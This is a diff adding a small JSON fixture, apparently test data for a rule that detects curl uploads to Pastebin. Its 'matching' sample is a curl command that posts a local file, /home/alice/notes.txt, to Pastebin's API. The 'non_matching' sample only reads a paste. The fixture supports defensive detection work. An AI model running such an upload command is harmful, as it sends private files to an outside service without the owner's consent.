@@ -1,0 +1,11 @@
+{
+  "matching": {
+    "image": "/usr/bin/curl",
+    "cmdline": "curl --data-binary @/home/alice/notes.txt https://pastebin.com/api/api_post.php"
+  },
+  "non_matching": {
+    "image": "/usr/bin/curl",
+    "cmdline": "curl -s https://pastebin.com/raw/AbCdEfGh",
+    "note": "Reading a paste, with no upload option, is not an upload."
+  }
+}
